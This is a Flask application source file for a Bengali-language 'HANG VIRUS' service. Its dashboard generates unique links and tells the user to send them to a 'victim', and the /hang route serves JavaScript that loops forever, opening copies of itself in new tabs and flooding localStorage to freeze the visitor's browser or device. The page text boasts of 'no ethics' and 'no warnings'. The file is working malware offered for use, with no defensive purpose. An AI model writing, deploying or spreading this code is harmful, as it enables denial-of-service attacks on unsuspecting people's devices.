# app.py
import uuid
import os
from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)

links = {}

dashboard_html = '''
<!DOCTYPE html>
<html>
<head>
    <title>হ্যাং ভাইরাস ড্যাশবোর্ড</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(145deg, #0a0f1e 0%, #0c1222 100%);
            font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1rem;
        }
        .card {
            background: rgba(18, 25, 45, 0.85);
            backdrop-filter: blur(12px);
            border-radius: 2.5rem;
            border: 1px solid rgba(72, 187, 255, 0.3);
            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(0, 255, 255, 0.1);
            max-width: 700px;
            width: 100%;
            padding: 2rem 2rem 2.5rem;
        }
        h1 {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(135deg, #fff, #4affff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 0.5rem;
        }
        .badge {
            display: inline-block;
            background: #ff336633;
            border-left: 3px solid #ff3366;
            padding: 0.3rem 1rem;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 500;
            color: #ff99aa;
            margin-bottom: 1.5rem;
        }
        .desc {
            color: #b0c4de;
            margin-bottom: 2rem;
            line-height: 1.5;
        }
        .link-container {
            background: #010409;
            border-radius: 1.5rem;
            padding: 0.2rem;
            display: flex;
            flex-wrap: wrap;
            gap: 0.5rem;
            border: 1px solid #2d3a5e;
            margin-bottom: 2rem;
        }
        .link-input {
            flex: 1;
            background: transparent;
            border: none;
            padding: 0.8rem 1.2rem;
            font-size: 1rem;
            font-family: 'Fira Code', monospace;
            color: #7effd4;
            outline: none;
        }
        .copy-btn {
            background: #1e2a4a;
            border: none;
            padding: 0 1.8rem;
            border-radius: 1.5rem;
            font-weight: 600;
            font-size: 0.9rem;
            color: white;
            cursor: pointer;
            transition: 0.2s;
        }
        .copy-btn:hover {
            background: #2a3a66;
            box-shadow: 0 0 6px #4affff;
        }
        .info-box {
            background: #0f1422cc;
            border-radius: 1.5rem;
            padding: 1.2rem;
            border: 1px dashed #2f4b7c;
            margin-bottom: 2rem;
        }
        .info-box p {
            color: #bbd9ff;
            font-size: 0.9rem;
            margin: 0.3rem 0;
        }
        .danger {
            color: #ff8888;
        }
        .footer {
            text-align: center;
            font-size: 0.7rem;
            color: #4f6f8f;
            margin-top: 1rem;
        }
        @media (max-width: 550px) {
            .card { padding: 1.5rem; }
            .link-container { flex-direction: column; }
            .copy-btn { padding: 0.7rem; }
        }
    </style>
</head>
<body>
<div class="card">
    <h1>💀 HANG VIRUS</h1>
    <div class="badge">⚡ ACTIVE · NO WARNINGS</div>
    <div class="desc">
        লিংক জেনারেট করুন, ভিকটিমকে পাঠান। ক্লিক করলেই ডিভাইস হ্যাং — চিরস্থায়ী।
    </div>
    
    <div class="link-container">
        <input type="text" class="link-input" id="malLink" value="{{ link }}" readonly>
        <button class="copy-btn" onclick="copyLink()">📋 কপি লিংক</button>
    </div>

    <div class="info-box">
        <p>⚠️ <strong>কিভাবে কাজ করে:</strong></p>
        <p>▶ অসীম while লুপ + মেমরি ফাটানো</p>
        <p>▶ ব্রাউজার ট্যাব ফোর্স-ক্লোজ ছাড়া বন্ধ হবে না</p>
        <p>▶ ভিকটিম পেজ আবার খুললেও আবার হ্যাং</p>
        <p class="danger">⛔ কোনো সতর্কতা / ডিসক্লেইমার নেই — সরাসরি ধ্বংস</p>
    </div>
    <div class="footer">
        built for survival — no ethics, just results
    </div>
</div>

<script>
function copyLink() {
    var copyText = document.getElementById("malLink");
    copyText.select();
    copyText.setSelectionRange(0, 99999);
    navigator.clipboard.writeText(copyText.value);
    alert("✅ লিংক কপি হয়েছে। ভিকটিমে পাঠাও।");
}
</script>
</body>
</html>
'''

@app.route('/')
def home():
    # রুট ইউআরএল খুললেই ড্যাশবোর্ড দেখাবে
    return redirect('/dashboard')

@app.route('/dashboard')
def dashboard():
    uid = str(uuid.uuid4())[:8]
    link = request.host_url + 'hang/' + uid
    links[uid] = False
    return render_template_string(dashboard_html, link=link)

@app.route('/hang/<uid>')
def hang(uid):
    if uid not in links:
        return "ভুল লিংক।"
    if links[uid]:
        return "ইতিমধ্যে হ্যাং করা হয়েছে।"
    links[uid] = True
    return '''
        <!DOCTYPE html>
        <html>
        <head><title>💀 HANG</title></head>
        <body>
        <script>
            (function() {
                while (true) {
                    window.open(window.location.href, '_blank');
                    for (let i = 0; i < 100000; i++) {
                        try {
                            localStorage.setItem('x'+i, 'x'.repeat(100000));
                        } catch(e) {}
                    }
                    setTimeout(function(){}, 0);
                }
            })();
        </script>
        <h1 style="color:red;text-align:center;margin-top:20%;">💀 HANGING...</h1>
        <p style="text-align:center">আপনার ডিভাইস হ্যাং হয়ে গেছে।</p>
        </body>
        </html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
